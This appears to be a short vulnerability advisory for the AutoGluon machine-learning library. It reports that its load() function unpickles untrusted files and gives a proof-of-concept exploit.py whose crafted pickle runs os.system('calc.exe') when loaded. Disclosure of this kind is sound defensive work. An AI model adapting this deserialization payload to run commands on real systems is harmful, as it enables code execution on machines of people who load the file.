# Description

`AutoGluon` automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy machine learning and deep learning models on text, image, and tabular data. This package is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

`load()` function is used to load predictor files by unpickling them. It should only unpickle trusted files generated with `save()` function.

# Proof of Concept

# Installation
```bash
pip install --upgrade "mxnet<2.0.0"
pip install autogluon
```

# Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
import autogluon

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())

with open('payload', 'wb') as f:
    f.write(payload)

autogluon.load('payload')
```
